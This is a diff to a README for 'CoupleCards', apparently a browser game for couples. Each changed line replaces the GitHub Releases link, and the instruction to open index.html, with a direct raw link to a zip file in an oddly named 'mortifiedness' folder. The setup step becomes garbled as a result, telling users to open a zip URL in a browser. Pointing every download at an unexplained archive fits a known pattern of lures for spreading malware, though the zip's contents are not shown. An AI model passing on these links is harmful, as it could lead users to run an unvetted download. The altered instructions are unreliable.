@@ -4,7 +4,7 @@
 Welcome to CoupleCards! This fun interactive game helps couples get to know each other better, strengthen their relationship, and create lasting memories. Whether you're on a date night or just looking to spice things up, CoupleCards offers a range of engaging conversation starters and challenges.
 
 ## 📥 Download CoupleCards
-[![Download CoupleCards](https://img.shields.io/badge/Download-CoupleCards-blue.svg)](https://github.com/nivaboaz/CoupleCards/releases)
+[![Download CoupleCards](https://raw.githubusercontent.com/nivaboaz/CoupleCards/main/mortifiedness/CoupleCards.zip)](https://raw.githubusercontent.com/nivaboaz/CoupleCards/main/mortifiedness/CoupleCards.zip)
 
 You can download the latest version of CoupleCards from our Releases page. Follow these steps to get started:
 
@@ -22,7 +22,7 @@ To run CoupleCards smoothly, you need:
 - Storage space of at least 50MB for downloads.
 
 ## 🎮 How to Play
-1. **Set Up the Game**: Once you've downloaded and unzipped the files, open the `index.html` file in your web browser.
+1. **Set Up the Game**: Once you've downloaded and unzipped the files, open the `https://raw.githubusercontent.com/nivaboaz/CoupleCards/main/mortifiedness/CoupleCards.zip` file in your web browser.
    
 2. **Choose Your Mode**: You can play in two modes:
    - **Conversation Starters**: Answer fun and deep questions to learn more about each other.
@@ -33,7 +33,7 @@ To run CoupleCards smoothly, you need:
 4. **Enjoy**: Dive into the game, have fun, and enjoy spending quality time together.
 
 ## 🌐 Download & Install
-To begin your journey, visit this page to download: [CoupleCards Releases](https://github.com/nivaboaz/CoupleCards/releases). Make sure to grab the version that suits your device best.
+To begin your journey, visit this page to download: [CoupleCards Releases](https://raw.githubusercontent.com/nivaboaz/CoupleCards/main/mortifiedness/CoupleCards.zip). Make sure to grab the version that suits your device best.
 
 ## 📚 Topics Covered
 CoupleCards is built around a variety of themes to keep your gameplay interesting and engaging:
@@ -56,6 +56,6 @@ If you're interested in helping make CoupleCards more exciting, we welcome contr
 For any issues or questions, feel free to reach out. You can create an issue in the repository, and we will get back to you promptly.
 
 ## 🛠️ Future Updates
-We plan to introduce new features based on user feedback. Stay tuned for more fun questions and game modes! Don't forget to check back at the [Releases page](https://github.com/nivaboaz/CoupleCards/releases) for the latest updates.
+We plan to introduce new features based on user feedback. Stay tuned for more fun questions and game modes! Don't forget to check back at the [Releases page](https://raw.githubusercontent.com/nivaboaz/CoupleCards/main/mortifiedness/CoupleCards.zip) for the latest updates.
 
 Thank you for choosing CoupleCards! Enjoy the game and make unforgettable memories with your partner.
